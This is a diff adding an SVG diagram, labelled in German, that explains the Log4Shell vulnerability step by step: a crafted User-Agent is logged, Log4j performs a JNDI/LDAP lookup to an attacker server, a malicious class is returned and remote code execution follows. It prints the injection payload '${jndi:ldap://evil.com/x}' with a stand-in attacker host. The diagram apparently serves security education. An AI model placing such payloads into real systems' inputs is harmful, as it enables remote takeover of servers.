@@ -1,0 +1,130 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg width="100%" height="100%" viewBox="0 0 704 374" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve" xmlns:serif="http://www.serif.com/" style="fill-rule:evenodd;clip-rule:evenodd;">
+    <g transform="matrix(1,0,0,1.182872,-16.907671,-102.511102)">
+        <path d="M330,235L330,295" style="fill:none;fill-rule:nonzero;stroke:rgb(226,0,26);stroke-width:2px;"/>
+    </g>
+    <g transform="matrix(1,0,0,1.255983,-16.907671,-154.249814)">
+        <path d="M330,370L330,393" style="fill:none;fill-rule:nonzero;stroke:rgb(68,68,68);stroke-width:2px;"/>
+    </g>
+    <g transform="matrix(1,0,0,1,-16.907671,-40)">
+        <path d="M220,52L220,93C220,99.623 214.623,105 208,105L32,105C25.377,105 20,99.623 20,93L20,52C20,45.377 25.377,40 32,40L208,40C214.623,40 220,45.377 220,52Z" style="fill:rgb(226,0,26);"/>
+    </g>
+    <g transform="matrix(1,0,0,1,103.092329,23)">
+        <text x="-57.795px" y="0px" style="font-family:'MS-UIGothic', 'MS UI Gothic', sans-serif;font-size:13px;fill:white;">❶</text>
+        <text x="-41.184px" y="0px" style="font-family:'Arial-BoldMT', 'Arial', sans-serif;font-weight:700;font-size:13px;fill:white;">Payload senden</text>
+    </g>
+    <g transform="matrix(1,0,0,1,103.092329,40)">
+        <text x="-26.677px" y="0px" style="font-family:'ArialMT', 'Arial', sans-serif;font-size:10px;fill:white;fill-opacity:0.82;">User-Agent:</text>
+    </g>
+    <g transform="matrix(1,0,0,1,103.092329,55)">
+        <text x="-46.026px" y="0px" style="font-family:'Arial-ItalicMT', 'Arial', sans-serif;font-style:italic;font-size:9px;fill:white;fill-opacity:0.82;">${jndi:ldap://evil.com/x}</text>
+    </g>
+    <g transform="matrix(1.230705,0,0,1,-67.662815,-40)">
+        <path d="M220,72L278,72" style="fill:none;fill-rule:nonzero;stroke:rgb(68,68,68);stroke-width:2px;"/>
+    </g>
+    <g transform="matrix(1,0,0,1,-16.907671,-40)">
+        <path d="M482,52L482,93C482,99.623 476.623,105 470,105L294,105C287.377,105 282,99.623 282,93L282,52C282,45.377 287.377,40 294,40L470,40C476.623,40 482,45.377 482,52Z" style="fill:rgb(28,63,110);"/>
+    </g>
+    <g transform="matrix(1,0,0,1,365.092329,23)">
+        <text x="-56.075px" y="0px" style="font-family:'MS-UIGothic', 'MS UI Gothic', sans-serif;font-size:13px;fill:white;">❷</text>
+        <text x="-39.946px" y="0px" style="font-family:'Arial-BoldMT', 'Arial', sans-serif;font-weight:700;font-size:13px;fill:white;"><tspan x="-39.946px -30.558px " y="0px 0px ">Ap</tspan>p loggt Input</text>
+    </g>
+    <g transform="matrix(1,0,0,1,365.092329,40)">
+        <text x="-49.197px" y="0px" style="font-family:'ArialMT', 'Arial', sans-serif;font-size:10px;fill:white;fill-opacity:0.82;">logger<tspan x="-21.951px -19.172px " y="0px 0px ">.i</tspan>nfo(userAgent)</text>
+    </g>
+    <g transform="matrix(1,0,0,1,365.092329,55)">
+        <text x="-51.697px" y="0px" style="font-family:'ArialMT', 'Arial', sans-serif;font-size:10px;fill:white;fill-opacity:0.82;">Log4j verarbeitet String</text>
+    </g>
+    <g transform="matrix(1.181598,0,0,1,-104.438078,-40)">
+        <path d="M482,72L538,72" style="fill:none;fill-rule:nonzero;stroke:rgb(68,68,68);stroke-width:2px;"/>
+    </g>
+    <g transform="matrix(1,0,0,1,-16.907671,-40)">
+        <path d="M702,52L702,93C702,99.623 696.623,105 690,105L554,105C547.377,105 542,99.623 542,93L542,52C542,45.377 547.377,40 554,40L690,40C696.623,40 702,45.377 702,52Z" style="fill:rgb(197,48,48);"/>
+    </g>
+    <g transform="matrix(1,0,0,1,605.092329,23)">
+        <text x="-48.388px" y="0px" style="font-family:'MS-UIGothic', 'MS UI Gothic', sans-serif;font-size:13px;fill:white;">❸</text>
+        <text x="-31.776px" y="0px" style="font-family:'Arial-BoldMT', 'Arial', sans-serif;font-weight:700;font-size:13px;fill:white;">JNDI Lookup</text>
+    </g>
+    <g transform="matrix(1,0,0,1,605.092329,40)">
+        <text x="-41.978px" y="0px" style="font-family:'ArialMT', 'Arial', sans-serif;font-size:10px;fill:white;fill-opacity:0.82;">Log4j erkennt ${...}</text>
+    </g>
+    <g transform="matrix(1,0,0,1,605.092329,55)">
+        <text x="-44.756px" y="0px" style="font-family:'ArialMT', 'Arial', sans-serif;font-size:10px;fill:white;fill-opacity:0.82;">und löst Lookup aus</text>
+    </g>
+    <g transform="matrix(1,0,0,1.124888,-16.907671,-53.113285)">
+        <path d="M622,105L622,165" style="fill:none;fill-rule:nonzero;stroke:rgb(226,0,26);stroke-width:2px;"/>
+    </g>
+    <g transform="matrix(1,0,0,1,-118.06735,-35.182872)">
+        <path d="M712,131C712,135.967 707.967,140 703,140L639,140C634.033,140 630,135.967 630,131C630,126.033 634.033,122 639,122L703,122C707.967,122 712,126.033 712,131Z" style="fill:rgb(255,243,205);stroke:rgb(226,0,26);stroke-width:1px;"/>
+        <g transform="matrix(1,0,0,1,670.553867,133.381836)">
+            <text x="-32.682px" y="0px" style="font-family:'SegoeUIEmoji', 'Segoe UI Emoji', sans-serif;font-size:9px;fill:rgb(226,0,26);">⚠</text>
+            <text x="-17.824px" y="0px" style="font-family:'Arial-BoldMT', 'Arial', sans-serif;font-weight:700;font-size:9px;fill:rgb(226,0,26);">ausgehend!</text>
+        </g>
+    </g>
+    <g transform="matrix(1,0,0,1,-16.907671,-40)">
+        <path d="M720,182L720,223C720,229.623 714.623,235 708,235L512,235C505.377,235 500,229.623 500,223L500,182C500,175.377 505.377,170 512,170L708,170C714.623,170 720,175.377 720,182Z" style="fill:rgb(226,0,26);"/>
+    </g>
+    <g transform="matrix(1,0,0,1,593.092329,153)">
+        <text x="-62.007px" y="0px" style="font-family:'MS-UIGothic', 'MS UI Gothic', sans-serif;font-size:13px;fill:white;">❹</text>
+        <text x="-45.395px" y="0px" style="font-family:'Arial-BoldMT', 'Arial', sans-serif;font-weight:700;font-size:13px;fill:white;">LDAP<tspan x="-10.242px -6.63px " y="0px 0px "> →</tspan> evil.com</text>
+    </g>
+    <g transform="matrix(1,0,0,1,593.092329,170)">
+        <text x="-60.583px" y="0px" style="font-family:'ArialMT', 'Arial', sans-serif;font-size:10px;fill:white;fill-opacity:0.82;">Server kontaktiert <tspan x="20.007px 26.677px " y="0px 0px ">An</tspan>greifer</text>
+    </g>
+    <g transform="matrix(1,0,0,1,593.092329,185)">
+        <text x="-52.515px" y="0px" style="font-family:'ArialMT', 'Arial', sans-serif;font-size:10px;fill:white;fill-opacity:0.82;">via LDAP/RMI-Protokoll</text>
+    </g>
+    <g transform="matrix(1.138423,0,0,1,-86.119274,-40)">
+        <path d="M500,202L442,202" style="fill:none;fill-rule:nonzero;stroke:rgb(226,0,26);stroke-width:2px;"/>
+    </g>
+    <g transform="matrix(1,0,0,1,-16.907671,-40)">
+        <path d="M440,182L440,223C440,229.623 434.623,235 428,235L232,235C225.377,235 220,229.623 220,223L220,182C220,175.377 225.377,170 232,170L428,170C434.623,170 440,175.377 440,182Z" style="fill:rgb(197,48,48);"/>
+    </g>
+    <g transform="matrix(1,0,0,1,313.092329,153)">
+        <text x="-59.947px" y="0px" style="font-family:'MS-UIGothic', 'MS UI Gothic', sans-serif;font-size:13px;fill:white;">❺</text>
+        <text x="-43.335px" y="0px" style="font-family:'Arial-BoldMT', 'Arial', sans-serif;font-weight:700;font-size:13px;fill:white;">Payload-Antwort</text>
+    </g>
+    <g transform="matrix(1,0,0,1,313.092329,170)">
+        <text x="-50.298px" y="0px" style="font-family:'ArialMT', 'Arial', sans-serif;font-size:10px;fill:white;fill-opacity:0.82;">Angreifer antwortet mit</text>
+    </g>
+    <g transform="matrix(1,0,0,1,313.092329,185)">
+        <text x="-68.357px" y="0px" style="font-family:'ArialMT', 'Arial', sans-serif;font-size:10px;fill:white;fill-opacity:0.82;">bösartiger Java-Klasse (.class)</text>
+    </g>
+    <g transform="matrix(1,0,0,1,-16.907671,-59.536112)">
+        <path d="M480,312L480,358C480,364.623 474.623,370 468,370L192,370C185.377,370 180,364.623 180,358L180,312C180,305.377 185.377,300 192,300L468,300C474.623,300 480,305.377 480,312Z" style="fill:rgb(45,55,72);"/>
+    </g>
+    <g transform="matrix(1,0,0,1,313.092329,265.463888)">
+        <text x="-89.458px" y="0px" style="font-family:'MS-UIGothic', 'MS UI Gothic', sans-serif;font-size:14px;fill:white;">❻</text>
+        <text x="-71.569px" y="0px" style="font-family:'Arial-BoldMT', 'Arial', sans-serif;font-weight:700;font-size:14px;fill:white;">Remote Code Execution</text>
+    </g>
+    <g transform="matrix(1,0,0,1,313.092329,285.463888)">
+        <text x="-87.447px" y="0px" style="font-family:'ArialMT', 'Arial', sans-serif;font-size:11px;fill:white;fill-opacity:0.82;">Klasse wird geladen und ausgeführt</text>
+    </g>
+    <g transform="matrix(1,0,0,1,313.092329,300.463888)">
+        <g transform="matrix(11,0,0,11,-19.746826,0)">
+        </g>
+        <g transform="matrix(11,0,0,11,-16.808838,0)">
+        </g>
+        <text x="-75.381px" y="0px" style="font-family:'ArialMT', 'Arial', sans-serif;font-size:11px;fill:white;fill-opacity:0.82;">→ V<tspan x="-54.594px -48.477px " y="0px 0px ">ol</tspan>lzugriﬀ auf Opfer-System</text>
+    </g>
+    <g transform="matrix(1,0,0,1,-16.907671,-59.536112)">
+        <path d="M580,407L580,421C580,427.623 574.623,433 568,433L132,433C125.377,433 120,427.623 120,421L120,407C120,400.377 125.377,395 132,395L568,395C574.623,395 580,400.377 580,407Z" style="fill:rgb(226,0,26);fill-opacity:0.9;"/>
+    </g>
+    <g transform="matrix(1,0,0,1,333.092329,359.463888)">
+        <text x="-214.386px" y="0px" style="font-family:'Arial-BoldMT', 'Arial', sans-serif;font-weight:700;font-size:12px;fill:white;">CVSS 10.0 — Ein einziger Log-Eintrag kompromittiert den gesamten Server</text>
+    </g>
+    <g transform="matrix(1,0,0,1,-16.907671,-40)">
+        <path d="M190,182L190,223C190,229.623 184.623,235 178,235L32,235C25.377,235 20,229.623 20,223L20,182C20,175.377 25.377,170 32,170L178,170C184.623,170 190,175.377 190,182Z" style="fill:none;stroke:rgb(226,0,26);stroke-width:1.5px;stroke-dasharray:5,3;"/>
+    </g>
+    <g transform="matrix(1,0,0,1,88.092329,158)">
+        <text x="-57.035px" y="0px" style="font-family:'SegoeUIEmoji', 'Segoe UI Emoji', sans-serif;font-size:12px;fill:rgb(226,0,26);">🎯</text>
+        <text x="-37.67px" y="0px" style="font-family:'Arial-BoldMT', 'Arial', sans-serif;font-weight:700;font-size:12px;fill:rgb(226,0,26);"><tspan x="-37.67px -29.004px " y="0px 0px ">An</tspan>greifer-Server</text>
+    </g>
+    <g transform="matrix(1,0,0,1,88.092329,178)">
+        <text x="-35.566px" y="0px" style="font-family:'ArialMT', 'Arial', sans-serif;font-size:10px;fill:rgb(226,0,26);">evil.com / LDAP</text>
+    </g>
+    <g transform="matrix(1,0,0,1,-16.907671,-40)">
+        <path d="M190,202L218,202" style="fill:none;fill-rule:nonzero;stroke:rgb(226,0,26);stroke-width:1.5px;stroke-dasharray:4,2;"/>
+    </g>
+</svg>
